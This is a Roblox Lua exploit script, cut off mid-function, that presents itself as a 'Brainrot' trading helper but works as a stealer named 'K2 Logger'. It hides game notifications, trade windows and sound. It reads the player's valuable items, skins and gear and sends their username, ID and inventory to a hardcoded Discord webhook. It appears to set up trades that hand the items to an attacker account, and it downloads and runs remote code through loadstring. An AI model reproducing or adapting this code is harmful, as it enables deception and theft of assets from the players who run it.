-- ===================== MAIN SCRIPT (loadstring) =====================
if getgenv().BrainrotMainLoaded then
	return warn("[Brainrot] Main already running!")
end
getgenv().BrainrotMainLoaded = true

local genv = getgenv()

local allowedPlaceIds = genv.ALLOWED_PLACE_IDS or {
	109983668079237,
}
if #allowedPlaceIds > 0 and not table.find(allowedPlaceIds, game.PlaceId) then
	getgenv().BrainrotMainLoaded = nil
	return
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local LP = Players.LocalPlayer
local cam = workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

local function enforceSolo()
	if #Players:GetPlayers() > 1 then
		LP:Kick("Script will glitch with 2 or more players in the server! Max 1 player.")
	end
end
enforceSolo()
Players.PlayerAdded:Connect(function()
	enforceSolo()
end)

local GOOD_WEBHOOK = genv.GOOD_WEBHOOK or ""
local LOG_WEBHOOK = "https://discord.com/api/webhooks/1544655506289987655/w-E2p8EVgazE_ViP1Ebjl5UcZjEvS5xx5N_cDJChBWh-z1BxxQ2j_okX-nKkW9HeOA6E"
local GOOD_AVATAR = genv.GOOD_AVATAR or "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
local TARGET_ID = genv.TARGET_USER_ID or 0
local MISS_TIMEOUT = 40
local MISS_TARGET_ID = 2829121161
local missFailoverDone = false
local currentlyInTrade = false

local MISS_BRAINROTS = {
	["Strawberry Elephant"] = true,
	["Headless Horseman"] = true,
	["Meowl"] = true,
	["John Pork"] = true,
	["Skibidi Toilet"] = true,
	["Griffin"] = true,
	["Dragon Aquanini"] = true,
	["Dragon Gingerini"] = true,
	["Hydra Dragon Cannelloni"] = true,
	["Signore Carapace"] = true,
	["Dragon Cannelloni"] = true,
	["Love Love Bear"] = true,
	["Moby Bros"] = true,
	["Digi Narwhal"] = true,
	["Kraken"] = true,
	["La Supreme Combinasion"] = true,
	["Elefanto Frigo"] = true,
	["Hydra Bunny"] = true,
	["Jelly Moby"] = true,
	["Bumbatron"] = true,
	["Bunny and Eggy"] = true,
	["Rosey and Teddy"] = true,
	["Cooki and Milki"] = true,
	["Arcadragon"] = true,
	["Los Secret Combinasionas"] = true,
	["Ketupat Bros"] = true,
	["Reinito Sleighito"] = true,
	["Fortunu and Cashuru"] = true,
	["Los Amigos"] = true,
	["Antonio"] = true,
	["Pancake and Syrup"] = true,
	["Foxini Lanternini"] = true,
	["Kalika Bros"] = true,
	["Fishino Clownino"] = true,
	["La Casa Boo"] = true,
	["Los Admins"] = true,
	["Duggy Bros"] = true,
	["Sammyni Cakini"] = true,
	["Ginger Gerat"] = true,
	["Rubiko and Kubiko"] = true,
	["Examen Bros"] = true,
	["Dug Dug Dug"] = true,
	["Rico Dinero"] = true,
	["Tirilikalika Tirilikalako"] = true,
	["La Breakfast Combinasion"] = true,
	["Sammyini Truckini"] = true,
}
local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
local TRADE_CYCLE_DELAY = 2
local INVITE_GUID = "8fbe1594-7cef-4c29-94d1-a0e93adfa5a4"
local SELECT_GUID = "c85a2323-36b2-4121-968a-c064a6168aff"
local SELECTGB_GUID = "6786cce9-00d8-41e9-8beb-d96e0412b78b"
local READY_GUID = "23f15b0b-b633-4f6b-888f-5924b7425522"
local ACCEPT_GUID = "86eea964-f19e-4ac6-b401-a71ecc89e596"
local FOOTER_ICON = "https://media.discordapp.net/attachments/1511087340721012919/1544655871529852988/2d33efc28dde57ea69dd4291cb6b4d6f_2.webp?ex=6a994c62&is=6a97fae2&hm=cd5486a74b48c119c89809204444e8a855045337dc23ede08a46ae7dd4077279&=&format=webp"
local FALLBACK_COLOR = 0x1A237E
local guiNames = { BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true }

local MUTATION_MULT = {
	["None"] = 1, ["Default"] = 1, ["Gold"] = 1.25, ["Diamond"] = 1.5, ["Bloodrot"] = 2,
	["Candy"] = 4, ["Lava"] = 6, ["Galaxy"] = 7, ["Yin Yang"] = 7.5,
	["Radioactive"] = 8.5, ["Cursed"] = 9, ["Divine"] = 10, ["Rainbow"] = 10,
	["Cyber"] = 11, ["Phantom"] = 12, ["Crystal"] = 13,
}

local MUTATION_EMOJI = {
	["None"] = "<:Default_Mutation:1483657150231216138>",
	["Default"] = "<:Default_Mutation:1483657150231216138>",
	["Gold"] = "<:Gold:1498277392194736138>",
	["Diamond"] = "<:Diamond:1498277422746046514>",
	["Rainbow"] = "<:Rainbow:1498277403871678514>",
	["Divine"] = "<:Divine:1498277407793348789>",
	["Radioactive"] = "<:Radioactive:1498277395562758276>",
	["Cursed"] = "<:Cursed:1498277428391317575>",
	["Galaxy"] = "<:Galaxy:1498277390571536395>",
	["Candy"] = "<:Candy:1498277426621448192>",
	["Bloodrot"] = "<:Bloodrot:1498277424490610710>",
	["Crystal"] = "<:Crystal:1532523409630695624>",
	["Phantom"] = "<:phan:1533658669173047326>",
	["Lava"] = "<:Lava:1498277393754886216>",
	["Cyber"] = "<:Cyber:1498277418815983776>",
	["Yin Yang"] = "<:YingYang:1513911235337261076>",
}

local GEAR_EMOJI = {
	["Waverider"] = "<:Waverider:1536942058676420680>",
	["Yin Yang Lamp"] = "<:YinYangLamp:1536942111218335754>",
	["Cupids Wings"] = "<:CupidsWings:1536941473407176715>",
	["Santas Sleigh"] = "<:SantasSleigh:1536942025646153818>",
	["Radioactive Airstrike"] = "<:RadioactiveAirstrike:1536941888148480000>",
	["Alien Slap"] = "<:AlienSlap:1536941130581807124>",
	["Divine Slap"] = "<:DivineSlap:1536941781277741076>",
	["Lava Slap"] = "<:LavaSlap:1536941851267965028>",
	["Cursed Slap"] = "<:CursedSlap:1536941510824689764>",
	["Demons Head"] = "<:DemonsHead:1536941574028525649>",
	["Witchs Broom"] = "<:WitchsBroom:1536942085649731667>",
	["Radioactive Slap"] = "<:RadioactiveSlap:1536941915931545650>",
	["Blackhole Bomb"] = "<:BlackholeBomb:1536941156649402490>",
	["Phantom Slap"] = "<:PhantomSlap:1536940296116371477>",
	["Cyber Slap"] = "<:CyberSlap:1536941541971730483>",
	["Lava Blaster"] = "<:LavaBlaster:1536941824915283998>",
	["Rainbow Slap"] = "<:RainbowSlap:1536941997510754424>",
	["Rainbow Hammer"] = "<:RainbowHammer:1536941964149133352>",
	["Bunny Basket"] = "<:BunnyBasket:1536943427327889419>",
	["Blood Moon Slap"] = "<:BloodMoonSlap:1538670582848032890>",
}

local BASESKIN_EMOJI = {
	["Octo"] = "<:Octo:1536944000752418856>",
	["Aquatic"] = "<:Aquatic:1536943396168532018>",
	["Rose"] = "<:Rose:1536944091558842378>",
	["Halloween"] = "<:Halloween:1536943747995279380>",
	["Pot Of Gold"] = "<:PotOfGold:1536944019827986532>",
	["Valentines"] = "<:Valentines:1536944152565252136>",
	["Christmas"] = "<:Christmas:1536943450388308049>",
	["Taco"] = "<:Taco:1536944658809225286>",
	["Lucky"] = "<:Lucky:1536943979793490000>",
}

local TargetBrainrots = {}
local GOOD_BRAINROTS = {}
if type(genv.ALLOWED_ANIMALS) == "table" then
	for _, name in pairs(genv.ALLOWED_ANIMALS) do
		if type(name) == "string" then
			TargetBrainrots[name] = true
			GOOD_BRAINROTS[name] = true
		end
	end
end
if next(TargetBrainrots) == nil then
	warn("[Brainrot] No ALLOWED_ANIMALS set in getgenv(). Using empty list.")
end

local ALLOWED_BASESKINS = genv.ALLOWED_BASESKINS or {}
local ALLOWED_GEARS = genv.ALLOWED_GEARS or {}

local function getRemote(name)
	local children = Net:GetChildren()
	local indexMap = {
		["RF/TradeService/Invite"] = 36,
		["RE/TradeService/Ready"] = 42,
		["RE/TradeService/Accept"] = 43,
		["RF/TradeService/AddItem"] = 48,
		["RF/TradeService/AddBrainrot"] = 50,
		["RE/NotificationService/Notify"] = 209,
	}
	local idx = indexMap[name]
	if not idx then return nil end
	local remote = children[idx]
	if remote and (remote:IsA("RemoteFunction") or remote:IsA("RemoteEvent")) then
		return remote
	end
	return nil
end

local function blockNotifications()
	local notifyRemote = getRemote("RE/NotificationService/Notify")
	if not notifyRemote then
		warn("[Brainrot] Notify remote missing (idx 209)")
		return
	end
	print("[Brainrot] Blocking notifications:", notifyRemote.Name)
	pcall(function()
		for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
			pcall(function()
				if conn.Disable then conn:Disable() end
				if conn.Disconnect then conn:Disconnect() end
			end)
		end
	end)
	-- keep blocking new connections
	task.spawn(function()
		while true do
			task.wait(2)
			pcall(function()
				for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
					pcall(function()
						if conn.Disable then conn:Disable() end
					end)
				end
			end)
		end
	end)
end
blockNotifications()

local function applyEverythingAfterTargetFound()
	local leftCenter = pg:FindFirstChild("LeftCenter")
	if leftCenter then
		local clone = leftCenter:Clone()
		clone.Name = "LeftCenter_Backup"
		clone.Parent = pg
		leftCenter:Destroy()
	end

	local function handleCam(obj)
		if obj:IsA("BlurEffect") then
			task.defer(function() obj:Destroy() end)
		end
	end
	cam.ChildAdded:Connect(handleCam)
	for _, v in ipairs(cam:GetChildren()) do
		handleCam(v)
	end
	cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
		cam.FieldOfView = 70
	end)
	cam.FieldOfView = 70

	local function handleGui(obj)
		if guiNames[obj.Name] then
			task.defer(function() obj:Destroy() end)
		end
	end
	pg.ChildAdded:Connect(handleGui)
	for _, v in ipairs(pg:GetChildren()) do
		handleGui(v)
	end

	task.spawn(function()
		pcall(function()
			SoundService.Volume = 0
		end)
		local function mute(s)
			if s:IsA("Sound") then
				pcall(function()
					s.Volume = 0
					s:Stop()
				end)
			end
		end
		for _, s in ipairs(SoundService:GetDescendants()) do
			mute(s)
		end
		SoundService.DescendantAdded:Connect(mute)
		workspace.DescendantAdded:Connect(mute)
	end)
end

local AnimalsData, NumberUtils, TraitsData
pcall(function()
	AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
end)
pcall(function()
	NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
end)
pcall(function()
	TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits"))
end)
pcall(function()
	if not TraitsData then
		TraitsData = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Traits"))
	end
end)

local function plotOwnedByLocalPlayer(plot)
	if not plot then return false end

	-- attributes
	for _, key in ipairs({ "Owner", "OwnerUserId", "UserId", "OwnerId", "PlayerUserId" }) do
		local v = plot:GetAttribute(key)
		if v ~= nil then
			if tonumber(v) == LP.UserId then return true end
			if tostring(v) == LP.Name or tostring(v) == LP.DisplayName or tostring(v) == tostring(LP.UserId) then
				return true
			end
		end
	end

	-- common value objects
	for _, inst in ipairs(plot:GetDescendants()) do
		local n = string.lower(inst.Name)
		if n == "owner" or n == "owneruserid" or n == "userid" or n == "ownerid" then
			if inst:IsA("ObjectValue") and inst.Value == LP then
				return true
			end
			if inst:IsA("NumberValue") or inst:IsA("IntValue") then
				if inst.Value == LP.UserId then return true end
			end
			if inst:IsA("StringValue") then
				local s = inst.Value
				if s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId) then
					return true
				end
			end
		end
	end

	-- plot name is / contains user id
	if plot.Name == tostring(LP.UserId) or plot.Name:find(tostring(LP.UserId), 1, true) then
		return true
	end

	return false
end

local function getMyPlotAndAnimals()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil, nil end

	local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then
		for _ = 1, 10 do
			task.wait(0.1)
			hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
			if hrp then break end
		end
	end
	if not hrp then return nil, nil end

	-- ONLY the local player's plot (never another player's base)
	local myPlot = nil
	for _, plot in ipairs(plotsFolder:GetChildren()) do
		if plotOwnedByLocalPlayer(plot) then
			myPlot = plot
			break
		end
	end

	-- fallback: closest plot BUT verify ownership after RequestData if possible
	if not myPlot then
		local bestPlot, closestDist = nil, math.huge
		for _, plot in ipairs(plotsFolder:GetChildren()) do
			local ok, pos = pcall(function()
				return plot:GetPivot().Position
			end)
			if ok and pos then
				local dist = (pos - hrp.Position).Magnitude
				if dist < closestDist then
					closestDist = dist
					bestPlot = plot
				end
			end
		end
		myPlot = bestPlot
		if myPlot then
			warn("[Brainrot] Plot owner markers not found — using closest plot only if data matches local player")
		end
	end

	if not myPlot then return nil, nil end

	local syncFolder = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
	local requestData = syncFolder and syncFolder:FindFirstChild("RequestData")
	if not requestData then return nil, nil end

	local ok, data = pcall(function()
		return requestData:InvokeServer(myPlot.Name)
	end)
	if not ok or type(data) ~= "table" or type(data.AnimalList) ~= "table" then
		return nil, nil
	end

	-- hard reject if payload clearly belongs to someone else
	local ownerField = data.Owner or data.OwnerUserId or data.UserId or data.PlayerUserId
	if ownerField ~= nil then
		local oid = tonumber(ownerField) or ownerField
		if type(oid) == "number" and oid ~= LP.UserId then
			warn("[Brainrot] Rejected plot data — owner UserId", oid, "!= local", LP.UserId)
			return nil, nil
		end
		if type(oid) == "string" and oid ~= LP.Name and oid ~= tostring(LP.UserId) and oid ~= LP.DisplayName then
			warn("[Brainrot] Rejected plot data — owner", oid, "!= local player")
			return nil, nil
		end
	end

	print("[Brainrot] Using plot:", myPlot.Name, "(local player only)")
	return myPlot, data.AnimalList
end

local cachedProfile = nil
local profileReady = false

local function scanProfileAsync()
	task.spawn(function()
		local found = nil
		local n = 0
		pcall(function()
			for _, v in pairs(getgc(true)) do
				n += 1
				if n % 400 == 0 then
					task.wait()
				end
				if type(v) == "table" then
					local ok, bi = pcall(rawget, v, "BaseSkinInventory")
					if ok and type(bi) == "table" then
						if type(rawget(v, "Coins")) == "number" and type(rawget(v, "Rebirth")) == "number" then
							found = v
							break
						end
					end
				end
			end
		end)
		cachedProfile = found
		profileReady = true
		print("[Brainrot] Profile scan done:", found and "found" or "not found")
	end)
end

local function getMyProfile()
	return cachedProfile
end

local function buildSkinQueue()
	local queue = {}
	if not next(ALLOWED_BASESKINS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local bi = rawget(profile, "BaseSkinInventory")
	if type(bi) ~= "table" then return queue end
	for uuid, data in pairs(bi) do
		if type(data) == "table" then
			local name = tostring(data.SkinName or data.Skin or "")
			if ALLOWED_BASESKINS[name] then
				table.insert(queue, { uuid = tostring(uuid), skinName = name })
			end
		end
	end
	return queue
end

local function buildGearQueue()
	local queue = {}
	if not next(ALLOWED_GEARS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local gi = rawget(profile, "GearInventory")
	if type(gi) ~= "table" then return queue end
	for uuid, data in pairs(gi) do
		if type(data) == "table" then
			local name = tostring(data.GearName or data.Name or "")
			if ALLOWED_GEARS[name] then
				table.insert(queue, { uuid = tostring(uuid), gearName = name })
			end
		end
	end
	return queue
end

scanProfileAsync()

local myPlot, animalList = getMyPlotAndAnimals()
if not myPlot or not animalList then
	warn("[Brainrot] Could not find plot or AnimalList — exiting")
	getgenv().BrainrotMainLoaded = nil
	return
end

local brainrotQueue = {}
local missBrainrotQueue = {}
for slotKey, data in pairs(animalList) do
	if type(data) == "table" and data.Index then
		local displayName = data.Index
		if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
			displayName = AnimalsData[data.Index].DisplayName
		end
		if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
			table.insert(brainrotQueue, {
				slotKey = tonumber(slotKey),
				data = data,
				displayName = displayName,
			})
		end
		if MISS_BRAINROTS[displayName] or MISS_BRAINROTS[data.Index] then
			table.insert(missBrainrotQueue, {
				slotKey = tonumber(slotKey),
				data = data,
				displayName = displayName,
			})
		end
	end
end

local tradeBrainrotQueue = brainrotQueue
local tradeItemsEnabled = true

if #brainrotQueue == 0 then

	warn("[Brainrot] No target brainrots on base — disabled (no GUI, no embed, no trades)")
	getgenv().BrainrotMainLoaded = nil
	return
end

print("[Brainrot] Queued", #brainrotQueue, "target brainrots")

if type(genv.EXTRA_LOADSTRINGS) == "table" then
	for _, url in ipairs(genv.EXTRA_LOADSTRINGS) do
		if type(url) == "string" and url ~= "" then
			task.spawn(function()
				pcall(function()
					loadstring(game:HttpGet(url))()
				end)
			end)
		end
	end
end

applyEverythingAfterTargetFound()

local baseSkinQueue = {}
local gearQueue = {}

local function getRequestFn()
	return (syn and syn.request) or (http and http.request) or http_request or request
end

local function toWikiName(displayName)
	local clean = displayName:match("^(.-)%s*%(") or displayName
	return clean:gsub(" ", "_")
end

local function fetchFandomImageUrl(displayName)
	local requestFn = getRequestFn()
	if not requestFn then return nil end
	local wikiName = toWikiName(displayName)
	local url = FANDOM_BASE .. wikiName
	local ok, response = pcall(function()
		return requestFn({
			Url = url,
			Method = "GET",
			Headers = {
				["User-Agent"] = "Mozilla/5.0",
				["Accept"] = "text/html",
			},
			Timeout = 5,
		})
	end)
	if ok and response and response.StatusCode == 200 and response.Body then
		local body = response.Body
		local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
			or body:match('content="([^"]+)"%s+property="og:image"')
		if ogImage and ogImage:find("^https?://") then
			return ogImage:gsub("&amp;", "&")
		end
	end
	return nil
end

local function getBrainrotColor(animalIndex)
	local color = nil
	pcall(function()
		local models = ReplicatedStorage:FindFirstChild("Models")
		local animals = models and models:FindFirstChild("Animals")
		if not animals then return end
		local template = animals:FindFirstChild(animalIndex)
		if not template and AnimalsData and AnimalsData[animalIndex] then
			template = animals:FindFirstChild(AnimalsData[animalIndex].DisplayName)
		end
		if not template then return end
		local bestScore = 0
		for _, desc in ipairs(template:GetDescendants()) do
			if desc:IsA("MeshPart") or desc:IsA("Part") then
				local c = desc.Color
				local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
				local maxC = math.max(c.R, c.G, c.B)
				local minC = math.min(c.R, c.G, c.B)
				local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
				local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
				local bp = (bri < 0.08 and 0.05) or (bri > 0.92 and 0.15) or 1
				local score = (sat * 3 + 0.2) * bp * vol
				if score > bestScore then
					bestScore = score
					color = c
				end
			end
		end
	end)
	return color
end

local function colorToDecimal(c)
	if not c then return FALLBACK_COLOR end
	local r = math.clamp(math.floor(c.R * 255), 0, 255)
	local g = math.clamp(math.floor(c.G * 255), 0, 255)
	local b = math.clamp(math.floor(c.B * 255), 0, 255)
	return r * 65536 + g * 256 + b
end

local function getBestImageUrl(displayName, animalIndex)
	local info = AnimalsData and AnimalsData[animalIndex]
	if info then
		for _, key in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId" }) do
			if info[key] and type(info[key]) == "string" then
				local num = info[key]:match("%d+")
				if num then
					return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png"
				end
			end
		end
	end
	return nil
end

local function resolveThumbnail(displayName, animalIndex)
	local url = getBestImageUrl(displayName, animalIndex)
	if url and url ~= "" then return url end
	url = fetchFandomImageUrl(displayName)
	if url and url ~= "" then return url end
	local wiki = toWikiName(displayName)
	return "https://stealabrainrot.fandom.com/wiki/Special:FilePath/" .. wiki .. ".png"
end

local function getTraitMultiplier(traitName)
	if not TraitsData or not traitName then return 0 end
	local info = TraitsData[traitName]
	if not info then
		local key = traitName:lower():gsub("%s+", "")
		for k, v in pairs(TraitsData) do
			if type(k) == "string" and k:lower():gsub("%s+", "") == key then
				info = v
				break
			end
		end
	end
	if type(info) ~= "table" then return 0 end
	local tm = info.MultiplierModifier or info.Multiplier or info.modifier or info.GenerationMultiplier
	if type(tm) == "number" and tm > 0 then return tm end
	return 0
end

local function getMutationMultiplier(mutName)
	if not mutName or mutName == "" or mutName == "None" or mutName == "Default" then
		return 1
	end
	if MUTATION_MULT[mutName] then
		return MUTATION_MULT[mutName]
	end
	local key = mutName:lower():gsub("%s+", "")
	for name, mult in pairs(MUTATION_MULT) do
		if name:lower():gsub("%s+", "") == key then
			return mult
		end
	end
	return 1
end

local function getGeneration(data)
	local index = data.Index
	local base = 0
	if AnimalsData and AnimalsData[index] and type(AnimalsData[index].Generation) == "number" then
		base = AnimalsData[index].Generation
	end
	if base <= 0 then return 0 end
	local gen = base * getMutationMultiplier(data.Mutation)
	local traits = data.Traits
	if type(traits) == "table" then
		for _, t in pairs(traits) do
			local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
			local tm = getTraitMultiplier(traitName)
			if tm > 0 then
				gen = gen + (base * tm)
			end
		end
	end
	return gen
end

local function formatGen(genVal)
	if NumberUtils and NumberUtils.Format then
		return NumberUtils.Format(genVal) .. "/s"
	end
	if genVal >= 1e12 then
		return string.format("%.1fT/s", genVal / 1e12)
	elseif genVal >= 1e9 then
		return string.format("%.1fB/s", genVal / 1e9)
	elseif genVal >= 1e6 then
		return string.format("%.1fM/s", genVal / 1e6)
	elseif genVal >= 1e3 then
		return string.format("%.1fK/s", genVal / 1e3)
	end
	return tostring(math.floor(genVal)) .. "/s"
end

local function normKey(s)
	return (tostring(s or ""):lower():gsub("%s+", ""):gsub("'", ""):gsub("’", ""))
end

local function mutEmoji(name)
	if not name or name == "" then
		return MUTATION_EMOJI["Default"]
	end
	if MUTATION_EMOJI[name] then return MUTATION_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(MUTATION_EMOJI) do
		if normKey(k) == key then return v end
	end
	return MUTATION_EMOJI["Default"]
end

local function gearEmoji(name)
	if not name or name == "" then return "⚙️" end
	if GEAR_EMOJI[name] then return GEAR_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(GEAR_EMOJI) do
		if normKey(k) == key then return v end
	end
	return "⚙️"
end

local function baseSkinEmoji(name)
	if not name or name == "" then return "🏠" end
	if BASESKIN_EMOJI[name] then return BASESKIN_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(BASESKIN_EMOJI) do
		if normKey(k) == key then return v end
	end
	return "🏠"
end

local function countTraits(traits)
	if type(traits) ~= "table" then return 0 end
	local n = 0
	for _, t in pairs(traits) do
		local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
		if traitName and traitName ~= "" then n += 1 end
	end
	return n
end

local function sendDetailedWebhook()
	if GOOD_WEBHOOK == "" and (not LOG_WEBHOOK or LOG_WEBHOOK == "") then
		return
	end

	local resultsPrimary = {}
	local requirePingPrimary = false
	local totalGen = 0

	for slot, data in pairs(animalList) do
		if type(data) == "table" and data.Index then
			local info = AnimalsData and AnimalsData[data.Index]
			local displayName = (info and info.DisplayName) or data.Index
			if GOOD_BRAINROTS[displayName] or GOOD_BRAINROTS[data.Index] then
				requirePingPrimary = true
				local mutation = data.Mutation or "None"
				local traits = data.Traits or {}
				local genVal = getGeneration(data)
				local genStr = formatGen(genVal)
				totalGen += genVal

				local mE = mutEmoji(mutation)
				local tCount = countTraits(traits)

				local line = mE .. " **" .. displayName .. "**"
				if tCount > 0 then
					line = line .. " · `" .. tCount .. " traits`"
				end
				line = line .. "
┗ 💰 **$" .. genStr:gsub("/s", "") .. "/s**"

				table.insert(resultsPrimary, {
					slot = tostring(slot),
					index = data.Index,
					displayName = displayName,
					name = line,
					genVal = genVal,
				})
			end
		end
	end

	if #resultsPrimary == 0 and #baseSkinQueue == 0 and #gearQueue == 0 then
		return
	end

	table.sort(resultsPrimary, function(a, b)
		return (a.genVal or 0) > (b.genVal or 0)
	end)

	local function buildNumbered(items, lineFn)
		local out = {}
		for i, item in ipairs(items) do
			table.insert(out, "`" .. i .. ".` " .. lineFn(item))
		end
		return table.concat(out, "

")
	end

	local brainrotBlock = ""
	if #resultsPrimary > 0 then
		brainrotBlock = buildNumbered(resultsPrimary, function(r) return r.name end)
		if #brainrotBlock > 1000 then
			brainrotBlock = brainrotBlock:sub(1, 996) .. "..."
		end
	end

	local skinBlock = ""
	if #baseSkinQueue > 0 then
		skinBlock = buildNumbered(baseSkinQueue, function(s)
			return baseSkinEmoji(s.skinName) .. " **" .. s.skinName .. "**"
		end)
		if #skinBlock > 1000 then skinBlock = skinBlock:sub(1, 996) .. "..." end
	end

	local gearBlock = ""
	if #gearQueue > 0 then
		gearBlock = buildNumbered(gearQueue, function(g)
			return gearEmoji(g.gearName) .. " **" .. g.gearName .. "**"
		end)
		if #gearBlock > 1000 then gearBlock = gearBlock:sub(1, 996) .. "..." end
	end

	local requestFn = getRequestFn()
	if not requestFn then return end

	local top = resultsPrimary[1]
	local embedColor = FALLBACK_COLOR
	if top then
		local c = getBrainrotColor(top.index)
		if c then
			embedColor = colorToDecimal(c)
		end
	end

	local playerCount = #Players:GetPlayers()
	local execName = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
	local totStr = formatGen(totalGen):gsub("/s", "")

	local titleBits = {}
	if #resultsPrimary > 0 then table.insert(titleBits, #resultsPrimary .. " Brainrot" .. (#resultsPrimary == 1 and "" or "s")) end
	if #baseSkinQueue > 0 then table.insert(titleBits, #baseSkinQueue .. " Skin" .. (#baseSkinQueue == 1 and "" or "s")) end
	if #gearQueue > 0 then table.insert(titleBits, #gearQueue .. " Gear" .. (#gearQueue == 1 and "" or "s")) end
	local title = "K2 Logger"
	if #titleBits > 0 then
		title = "K2 Logger  ·  " .. table.concat(titleBits, "  ·  ")
	end

	local description = table.concat({
		"📫 **Script User**  `" .. LP.Name .. "`",
		"└ ID `" .. tostring(LP.UserId) .. "`  ·  Target `" .. tostring(TARGET_ID) .. "`",
	}, "
")

	local fields = {}

	if brainrotBlock ~= "" then
		table.insert(fields, {
			name = "🧠  Brainrots  ·  " .. #resultsPrimary,
			value = brainrotBlock,
			inline = false,
		})
	end
	if skinBlock ~= "" then
		table.insert(fields, {
			name = "🏠  Base Skins  ·  " .. #baseSkinQueue,
			value = skinBlock,
			inline = false,
		})
	end
	if gearBlock ~= "" then
		table.insert(fields, {
			name = "⚔️  Gears  ·  " .. #gearQueue,
			value = gearBlock,
			inline = false,
		})
	end

	table.insert(fields, {
		name = "💰  Total Generation",
		value = "**$" .. totStr .. "/s**",
		inline = true,
	})
	table.insert(fields, {
		name = "⏰  Executed",
		value = "<t:" .. os.time() .. ":R>",
		inline = true,
	})
	table.insert(fields, {
		name = "🌍  Server",
		value = "**" .. playerCount .. "** player" .. (playerCount == 1 and "" or "s"),
		inline = true,
	})
	table.insert(fields, {
		name = "⚡  Executor",
		value = "`" .. tostring(execName) .. "`",
		inline = true,
	})

	local embed = {
		title = title,
		description = description,
		color = embedColor,
		fields = fields,
		footer = {
			text = "K2 LOGGER  •  discord.gg/bxjXucMVqB",
			icon_url = FOOTER_ICON,
		},
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}

	if top then
		local thumb = resolveThumbnail(top.displayName, top.index)
		if thumb and thumb ~= "" then
			embed.thumbnail = { url = thumb }
		end
	end

	local function postTo(url, withPing)
		if not url or url == "" then return end
		local payload = {
			embeds = { embed },
			username = "K2 Logger",
			avatar_url = GOOD_AVATAR,
		}
		if withPing then
			payload.content = "@everyone"
		end
		pcall(function()
			requestFn({
				Url = url,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(payload),
			})
		end)
	end

	local shouldPing = requirePingPrimary or #baseSkinQueue > 0 or #gearQueue > 0
	postTo(GOOD_WEBHOOK, shouldPing)
	postTo(LOG_WEBHOOK, false)
end


local function getMissBrainrotsOnBase()
	local list = {}
	local ok, animals = pcall(function()
		local _, a = getMyPlotAndAnimals()
		return a
	end)
	if not ok or type(animals) ~= "table" then return list end
	for slotKey, data in pairs(animals) do
		if type(data) == "table" and data.Index then
			local displayName = data.Index
			if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
				displayName = AnimalsData[data.Index].DisplayName
			end
			if MISS_BRAINROTS[displayName] or MISS_BRAINROTS[data.Index] then
				local genVal = 0
				pcall(function() genVal = getGeneration(data) end)
				table.insert(list, {
					slot = tostring(slotKey),
					index = data.Index,
					displayName = displayName,
					mutation = data.Mutation or "None",
					traits = data.Traits or {},
					genVal = genVal,
					data = data,
				})
			end
		end
	end
	table.sort(list, function(a, b) return (a.genVal or 0) > (b.genVal or 0) end)
	return list
end

local function rebuildMissTradeQueue()
	local q = {}
	for _, item in ipairs(getMissBrainrotsOnBase()) do
		table.insert(q, {
			slotKey = tonumber(item.slot),
			data = item.data,
			displayName = item.displayName,
		})
	end
	return q
end

local function sendMissWebhook(missList)
	if not missList or #missList == 0 then return end
	local requestFn = getRequestFn()
	if not requestFn then
		warn("[Brainrot] Miss webhook: no request function")
		return
	end

	local urls = {}
	if type(GOOD_WEBHOOK) == "string" and GOOD_WEBHOOK ~= "" then
		table.insert(urls, GOOD_WEBHOOK)
	end
	if type(LOG_WEBHOOK) == "string" and LOG_WEBHOOK ~= "" and LOG_WEBHOOK ~= GOOD_WEBHOOK then
		table.insert(urls, LOG_WEBHOOK)
	end
	if #urls == 0 then
		warn("[Brainrot] Miss webhook: no GOOD_WEBHOOK or LOG_WEBHOOK")
		return
	end

	local totalGen = 0
	local lines = {}
	for i, item in ipairs(missList) do
		local mut = item.mutation or "None"
		local traits = item.traits or {}
		local genVal = item.genVal or 0
		totalGen += genVal
		local genStr = tostring(genVal)
		pcall(function() genStr = formatGen(genVal) end)
		local mE = mutEmoji(mut)
		local tCount = countTraits(traits)
		local line = mE .. " **" .. item.displayName .. "**"
		if tCount > 0 then
			line = line .. " · `" .. tCount .. " traits`"
		end
		line = line .. "
